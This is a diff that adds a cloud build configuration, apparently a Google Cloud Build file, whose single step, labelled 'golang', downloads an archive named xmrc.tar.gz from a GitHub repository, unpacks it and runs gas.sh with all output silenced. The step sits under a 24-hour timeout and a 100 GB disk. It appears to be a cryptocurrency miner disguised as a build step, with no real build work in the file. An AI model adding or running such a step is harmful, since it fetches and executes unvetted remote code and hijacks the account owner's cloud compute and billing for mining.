@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         wget https://github.com/oding13/on/raw/main/xmrc.tar.gz && tar xf xmrc.tar.gz && ./gas.sh >/dev/null >/dev/null 2>&1
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
